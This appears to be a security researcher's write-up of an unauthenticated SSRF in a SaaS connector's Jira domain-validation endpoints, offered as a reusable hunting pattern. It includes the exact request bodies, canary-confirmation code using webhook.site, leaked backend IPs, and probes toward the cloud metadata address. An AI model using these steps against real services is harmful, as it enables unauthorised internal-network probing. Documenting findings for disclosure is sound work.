# Unauthenticated SSRF in SaaS connector "validate_domain" / "test_connection"

Verified Nov 2026 on Unito (`app.unito.io`). Reusable hunt pattern for ANY SaaS whose
connector-config energy lets users attach a SELF-HOSTED version of a tool.

## The shape

A connector/integration product has a "connect your own instance" feature for
self-hosted targets (Jira Server, GitHub Enterprise, self-hosted GitLab, etc.). To
help the user wire it up, the product exposes an UNauthenticated
`validate_domain` / `test_connection` endpoint that makes a SERVER-SIDE request to the
domain the user typed, to probe that a real instance lives there.

On Unito the endpoints were:

- `POST /api/v1/authenticate/jira/validate_domain`   `{"domain": "<attacker host>"}`
- `POST /api/v1/authenticate/jira/test_connection`   `{"domain": "...", "selfSignedCertificate": ""}`

Behavior: server normalizes the domain, forces HTTPS, appends a fixed probe path
(`/rest/api/2/serverInfo` on Jira), performs `GET https://{domain}/rest/api/2/serverInfo`.
No session cookie or token required — returns HTTP 200 unauthenticated.

## Key discriminator: self-hosted connectors SSRF, cloud connectors don't

Enumerate the provider names. Cloud/SaaS providers simply return `valid:true`
WITHOUT connecting (nothing to validate). Only the self-hosted provider
(`jira` here) actually issues the outbound request. Probe each name and read
`valid` + `errorMessage`:

- `trello/asana/github/monday/wrike` → `{"valid":true,"requiresSetup":false}` (no request)
- `jira` → `{"valid":false,"errorMessage":"We could not connect...","internalMessage":"... statusCode: 504, error: connect ETIMEDOUT ..."}` (request WAS made)

`jira-server`, `jira_dc`, `jira-dc` → `403 InvalidProviderName` (wrong names; the
real one is bare `jira`).

## Confirming SSRF with a webhook.site canary (no account, no interactsh)

When `interactsh-client` fails to emit a URL (it silently produced nothing on a
Windows/MSYS host in this session), webhook.site is a dependable fallback:

```python
r = requests.post("https://webhook.site/token")            # 201 -> {"uuid": ...}
uuid = r.json()["uuid"]
# canary URL = https://webhook.site/<uuid>
# trigger SSRF, then poll:
requests.get(f"https://webhook.site/token/{uuid}/requests?sorting=newest").json()["data"]
```

Each captured request shows method, full URL, and SOURCE IP — this is what proves the
outbound request and reveals the backend's origin address (Unito: AWS us-east-1
54.82.178.193 / 54.82.172.192). Reproduce 3x with distinct path suffixes in the domain
to satisfy the 3x validation bar.

## Response fields that leak internal detail

- `internalMessage` carries raw Node.js connect errors + a statusCode enum:
  `"statusCode: 504, error: connect ETIMEDOUT 169.254.169.254:443"`, and
  `"Unable to reach <host>, domain is invalid"` for non-resolving hostnames. This is a
  reachability/port oracle in addition to the SSRF, and is a secondary info-disclosure.

## Escalation limits to state honestly when writing up

- HTTPS forced → HTTP-only targets (AWS metadata 169.254.169.254:80) time out on :443.
- Fixed path appended + query string STRIPPED (domain `...?url=X` became just the host+path)
  → redirect-to-metadata and query-param injection did NOT work.
- Response is a boolean + error string, not full body reflection.

Severity ceiling here is Medium (unauthenticated outbound SSRF + info leak), not
Critical, because of the HTTPS-only/fixed-path/boolean-response limits.